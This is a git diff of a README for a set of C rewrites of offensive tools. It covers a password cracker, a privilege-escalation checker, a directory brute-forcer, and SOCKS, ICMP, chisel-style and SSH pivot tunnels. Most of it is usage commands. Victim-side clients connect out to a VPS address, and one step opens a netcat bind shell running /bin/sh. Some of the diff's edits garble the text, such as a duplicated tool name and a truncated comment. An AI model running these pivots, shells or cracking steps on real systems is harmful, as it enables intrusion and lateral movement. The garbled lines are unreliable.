@@ -39,11 +39,11 @@ gcc -o strings2 strings2.c -lm
 ./strings2 dump.dmp -x | less -R
 </pre>
 
-4. John The Ripper
+4. john-the-ripper The Ripper
 
 <pre>
-gcc -O3 -o tinyjohn tinyjohn.c -lcrypto -lpthread
-./tinyjohn hashes.txt /usr/share/wordlists/rockyou.txt
+gcc -O3 -o john-the-ripper john-the-ripper.c -lcrypto -lpthread
+./john-the-ripper hashes.txt /usr/share/wordlists/rockyou.txt
 
 Real-world performance (on an i7)
 
@@ -174,7 +174,7 @@ x86_64-w64-mingw32-gcc -O2 -s -o winpeas-c.exe winpeas-c.c -ladvapi32 -luserenv 
 # 32-bit (for old systems)
 i686-w64-mingw32-gcc -O2 -s -o winpeas-c-32.exe winpeas-c.c -ladvapi32 -luserenv -lnetapi32
 
-# Optional: make it tiny
+# Optional: make it 
 upx --best winpeas-c.exe
 
 === Unquoted Service Paths ===
@@ -267,6 +267,83 @@ x86_64-w64-mingw32-gcc -O3 -o dirbrute.exe dirbrute.c -lssl -lcrypto -lpthread -
 # Go fast
 ./dirbrute https://target.com
 ./dirbrute http://192.168.1.100 -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
+</pre>
+
+17. Socks Tunnel
+
+<pre>
+gcc socks.c -o socks -pthread
+
+# Terminal 1 – Start the tiny SOCKS server on the "compromised" host (pivot)
+./tiny_socks -p 1080
+
+# Terminal 2 – Simulate internal services (only bind to loopback)
+nc -l 127.0.0.1 8080 < index.html
+nc -l 127.0.0.1 2222   # pretend it's an internal SSH
+
+# Terminal 3 – From attacker, use the SOCKS proxy
+
+export http_proxy=socks5h://127.0.0.1:1080
+curl http://127.0.0.1:8080      # → should work through the pivot
+ssh -o ProxyCommand="ncat --proxy 127.0.0.1:1080 --proxy-type socks5 %h %p" user@127.0.0.1 -p 2222
+</pre>
+
+18. ICMP Tunnel
+
+<pre>
+# On both machines (requires root)
+sudo gcc icmp-tunnel.c -o icmp-tunnel -lpcap -pthread
+
+# On your VPS / pivot (server)
+sudo ./icmp-tunnel server 0.0.0.0
+
+# On victim machine (client)
+sudo ./icmp-tunnel client 45.79.123.45
+
+# → SOCKS5 proxy appears on 127.0.0.1:1080
+curl --socks5 localhost:1080 http://10.10.10.10
+
+</pre>
+
+19. Chisel clone
+
+<pre>
+gcc -O2 -pthread chisel.c -o chisel
+
+# Fake internal web server
+echo "<h1>Internal Web</h1>" | nc -l -p 8080
+
+# Fake internal SSH
+nc -l -p 2222 -e /bin/sh   # or just: nc -l -p 2222
+
+# Fake internal Windows box (RDP)
+nc -l -p 3389 <<< "Windows Secret"
+
+# Terminal 2 – chisel server (the "pivot")
+./chisel server -p 9000 --reverse
+
+# Terminal 3 – chisel client (the "victim")
+./chisel client 127.0.0.1:9000 R:1080:socks
+
+curl --socks5 localhost:1080 http://127.0.0.1:8080      # → Internal Web
+curl --socks5 localhost:1080 http://127.0.0.1:2222      # → shell
+curl --socks5 localhost:1080 http://127.0.0.1:3389      # → Windows Secret
+</pre>
+
+20. SSH Dynamic Pivot
+
+<pre>
+gcc -O2 -pthread ssh-d.c -o ssh-d
+
+# On pivot/VPS – start server
+./ssh-d server 9000
+
+# On victim/attacker – create dynamic pivot
+./ssh-d 1080 45.79.123.45 9000
+
+# Now use it
+curl --socks5 localhost:1080 http://10.10.10.10
+proxychains -q nmap -sT 172.16.0.0/24
 </pre>
 
 > P.S. I just can't sit idle and do nothing. I need to have something going on to keep myself busy. For this project, I used Grok because of unrestricted tokens, no rate limits and premium subscription required. This project has been birthed during Thanksgiving weekend. I hope everyone is thankful for the contributions made in this project :)
